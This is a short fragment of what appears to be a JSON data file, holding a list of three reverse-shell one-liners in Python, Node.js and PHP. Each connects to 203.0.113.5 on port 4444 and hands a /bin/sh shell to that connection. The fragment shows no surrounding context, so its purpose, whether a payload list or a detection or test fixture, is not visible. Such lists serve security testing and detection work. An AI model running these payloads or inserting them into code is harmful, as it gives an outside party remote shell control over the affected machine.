        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('203.0.113.5',4444));os.dup2(s.fileno(),0)",
        "var c=new net.Socket();c.connect(4444,'203.0.113.5',function(){var sh=require('child_process').spawn('/bin/sh',[]);});",
        "$s=fsockopen('203.0.113.5',4444);exec('/bin/sh -i <&3 >&3 2>&3');"
      ],
